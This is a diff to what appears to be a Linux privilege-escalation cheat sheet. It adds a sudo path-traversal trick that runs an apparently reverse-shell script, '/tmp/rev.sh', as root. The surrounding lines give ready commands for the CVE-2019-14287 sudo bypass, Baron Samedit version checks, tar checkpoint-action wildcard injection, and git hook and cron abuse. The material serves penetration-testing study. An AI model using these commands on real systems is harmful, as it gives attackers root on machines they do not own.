@@ -340,6 +340,8 @@ crontab -l; cat /etc/crontab
 ./pspy64 -pf -i 1000                          # watch cron/procs as root fires them (no root needed)
 sudo -u#-1 /bin/bash                           # CVE-2019-14287, when sudo -l shows (ALL, !root)
 sudo --version                                 # &lt; 1.9.5p2 -&gt; Baron Samedit CVE-2021-3156, any local user, no sudo rule
+# sudo rule naming a path/wildcard is a pattern, not a fence: (root) /bin/nice /notes/*.sh
+sudo /bin/nice /notes/../tmp/rev.sh            # traverse out of it; trailing * = append your own flags
 # root runs a writable thing: cron/systemd-timer script | /etc/update-motd.d/* (fires on SSH login)
 # root &#x27;tar ... *&#x27; in a writable dir -&gt; touch -- &#x27;--checkpoint=1&#x27; &#x27;--checkpoint-action=exec=sh x.sh&#x27;
 # root job runs git in a repo you can write -&gt; .git/hooks/pre-commit (or post-commit), chmod +x, runs as root
